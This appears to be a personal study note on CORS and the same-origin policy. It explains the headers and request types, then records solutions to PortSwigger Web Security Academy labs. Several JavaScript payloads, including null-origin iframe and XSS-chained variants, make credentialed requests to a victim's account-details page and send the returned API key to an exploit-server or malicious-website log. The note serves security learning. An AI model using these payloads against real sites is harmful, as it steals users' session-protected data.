---
title: "CORS - Cross-Origin Resource Sharing"
parent: "Client-Side"
grand_parent: "4 - Web_Application"
nav_order: 2
layout: default
---

# CORS - Cross-Origin Resource Sharing

Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the same-origin policy (SOP).

![](/assets/images/Cross-origin%20Resource%20Sharing%20(CORS)/CORS.png)

- Same-origin policy is safer
- Modern websites use CORS for sub-domains and trusted websites, but they can mess up the config

## Overview

### Definitions

**Same-Origin Policy (SOP)** restricts how a webpage can interact with resources from a different origin (defined by protocol, domain, and port).
- Under SOP, scripts running on a webpage can only access resources that share the same origin as the webpage.
- A script running on `http://test.com` (non-secure HTTP) is not allowed to access resources on `https://test.com` (secure HTTPS), even though they share the same domain because the protocols are different.

**Cross Origin Resource Sharing (CORS)** is a protocol that allows servers to indicate which origins are permitted to access their resources.
- It is a relaxation of the SOP but with explicit permissions.
- A server sends specific HTTP headers (e.g., `Access-Control-Allow-Origin`) to specify allowed origins for cross-origin requests.
- CORS enables scenarios like fetching data from APIs on another domain, embedding third-party content, or enabling communication across microservices hosted on different domains.
- It's important to note that the s*erver does not block or allow a request based on CORS; instead, it processes the request and includes CORS headers in the response*. The browser then interprets these headers and enforces the CORS policy by granting or denying the web page's JavaScript access to the response based on the specified rules.

In other words *SOP provides the default security posture, while CORS allows secure exceptions to the SOP*. Without SOP, there would be no need for CORS. CORS exists because SOP blocks cross-origin requests by default.
- **Implementation**: When a browser encounters a cross-origin request, it evaluates the CORS headers sent by the server to determine if the request should proceed. If the headers are absent or invalid, the SOP restriction remains in effect.

### CORS
Headers involved in CORS:
1. **Access-Control-Allow-Origin**: This header specifies which domains are allowed to access the resources. For example, `Access-Control-Allow-Origin: example.com` allows only requests from `example.com`.
2. **Access-Control-Allow-Methods**: Specifies the allowed HTTP methods 
3. **Access-Control-Allow-Headers**: Specifies the allowed HTTP Headers
4. **Access-Control-Max-Age**: Defines how long the results of a preflight request can be cached.
5. **Access-Control-Allow-Credentials**: This header instructs the browser whether to expose the response to the frontend JavaScript code when credentials like cookies, HTTP authentication, or client-side SSL certificates are sent with the request. If Access-Control-Allow-Credentials is set to true, it allows the browser to access the response from the server when credentials are included in the request. It's important to note that when this header is used, Access-Control-Allow-Origin cannot be set to * and must specify an explicit domain to maintain security.

There are two primary types of requests in CORS: **simple requests** and **preflight requests**:
1. **Simple Requests**: Meet certain criteria set by CORS that make them "simple". They are treated similarly to same-origin requests, with some restrictions. A request is considered simple if:
	1. It uses the GET, HEAD, or POST method, 
	2. And the POST request's `Content-Type` header is one of `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain`. 
	3. Additionally, the request should not include custom headers that aren't CORS-safe listed. 
2. Simple requests are sent directly to the server with the `Origin` header, and the response is subject to CORS policy enforcement based on the `Access-Control-Allow-Origin` header. 
3. Importantly, cookies and HTTP authentication data are included in simple requests if the site has previously set such credentials, even without the `Access-Control-Allow-Credentials` header being true.
    
4. **Preflight Requests**: The browser "preflights" requests with an OPTIONS request before sending the actual request to ensure that the server is willing to accept the request based on its CORS policy. *Preflight is triggered when the request does not qualify as a "simple request"*. The preflight OPTIONS request includes headers like `Access-Control-Request-Method` and `Access-Control-Request-Headers`, indicating the method and custom headers of the actual request. The server must respond with appropriate CORS headers, such as `Access-Control-Allow-Methods`, `Access-Control-Allow-Headers`, and `Access-Control-Allow-Origin` to indicate that the actual request is permitted. If the preflight succeeds, the browser will send the actual request with credentials included if `Access-Control-Allow-Credentials` is set to true.

### Access-Control-Allow-Origin Header
THE ACAO header is used by servers to indicate whether the resources on a website can be accessed by a web page from a different origin. This header is part of the HTTP response provided by the server. Options:
1. Single origin: (explicitly defined)
2. Multiple Origin: (explicitly defined)
3. Wildcard Origin: (`*`) least secure
4. With credentials: `Access-Control-Allow-Origin` set to a specific origin (wildcards not allowed), along with `Access-Control-Allow-Credentials: true`

Analysis: 

Testing for CORS misconfigurations
1. change the `Origin:` header to an arbitrary value 
2. Change the `Origin:` header to a `null` value 

```html
<html>
    <body>
        <script> 
            var xhr = new XMLHttpRequest();
            var url = "https://0ac600c404a6cb6080ea034400a400c3.web-security-academy.net/"
            
            xhr.onreadystatechange = function() {
                if (xhr.readyState == XMLHttpRequest.done){
                    fetch("/log?key=" + xhr.responseText)
                }
            }
            
            xhr.open('GET', url + "/accountDetails", true);
            xhr.withCredentials = true;
            xhr.send(null)
        </script>
    </body>
</html>     
```
- Makes a GET request to the account details of the application and asks the browser to send any cookies that the browser has stored and then sending the request
- When the request has sent, we capture the response of and adding it to the logs of the malicious server
- **This didn't work**
- This did:
```html
<script>
fetch('https://0ac70075042afb7e80da268b00f000d1.web-security-academy.net/accountDetails', {
  method: 'GET',
  credentials: 'include',
  headers: {
    'Origin': 'https://exploit-0a5900f90462fb118093258201a50042.exploit-server.net/'
  }
})
  .then(response => response.json())
  .then(data => {
    const apiKey = data.apikey;
    fetch(`https://exploit-0a5900f90462fb118093258201a50042.exploit-server.net/log?apiKey=${apiKey}`);
  });
</script>
```

From Burp:
```html
<script> 
	var req = new XMLHttpRequest(); 
	req.onload = reqListener; 
	req.open('get','https://0ac70075042afb7e80da268b00f000d1.web-security-academy.net/accountDetails',true); 
	req.withCredentials = true; 
	req.send(); 
	
	function reqListener() { location='/log?key='+this.responseText;
	}; 
</script>
```

Origin header: 
- Sometimes you send the header and it responds with true to show that it's allowed
```http
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: https://malicious-website.com 
Access-Control-Allow-Credentials: true
```
If the response contains any sensitive information such as an API key or CSRF token, you could retrieve this by placing the following script *on your website*:cc

```
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true); 
req.withCredentials = true; 
req.send(); 

function reqListener() { 
	location='//malicious-website.com/log?key='+this.responseText; 
};
```

Sometimes you just get an `Access-Control-Allow-Origin` header back, not a true or false

Misconfiguration: 
- `normal-website.com` could allow
	- `hackersnormal-website.com`
	- `normal-website.com.evil-user.net`


## CORS vulnerability with trusted null origin
This worked to send from the exploit server 

```html
<iframe style="display: none;" sandbox="allow-scripts" srcdoc="  
<script>  
var req = new XMLHttpRequest();  
var url = 'https://0afc003c0370951481530238001700c4.web-security-academy.net'  
req.onreadystatechange = function() {  
        if (req.readyState == XMLHttpRequest.DONE){  
        fetch('https://exploit-0a08003e03a595cd81600195011000b5.exploit-server.net/exploit/log?key=' + req.responseText)  
         }  
        }  
req.open('GET', url + '/accountDetails', true);  
req.withCredentials = true;  
req.send(null);  
</script>"></iframe>
```



## 3
Even "correctly" configured CORS establishes a trust relationship between two origins. If a website trusts an origin that is vulnerable to cross-site scripting (XSS), then an attacker could exploit the XSS to inject some JavaScript that uses CORS to retrieve sensitive information from the site that trusts the vulnerable application.
- The trick is to find a vulnerability on `Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com`
- Also sometimes it trust a website that uses HTTP rather than HTTPS

Most CORS attacks rely on the presence of the response header:

`Access-Control-Allow-Credentials: true`

```
<script>            

	document.location="http://stock.0ad800f00471924f82d91fd700c9002d.web-security-academy.net/?productId=<script>var req = new XMLHttpRequest();var url = 'https://0ad800f00471924f82d91fd700c9002d.web-security-academy.net';req.onreadystatechange = function(){if (req.readyState == XMLHttpRequest.DONE) {fetch('https://exploit-0afd006a041b923982861ede01bc00ff.exploit-server.net/exploit/log?key=' %2b req.responseText)};};req.open('GET', url %2b '/accountDetails', true); req.withCredentials = true;req.send(null);%3c/script>&storeId=1"
	
</script>
```




Without that header, the victim user's browser will refuse to send their cookies, meaning the attacker will only gain access to unauthenticated content, which they could just as easily access by browsing directly to the target website.


## Further Reading
https://medium.com/@mahakjaiswani888/navigating-cors-exploring-with-portswigger-labs-c13b37310cf3
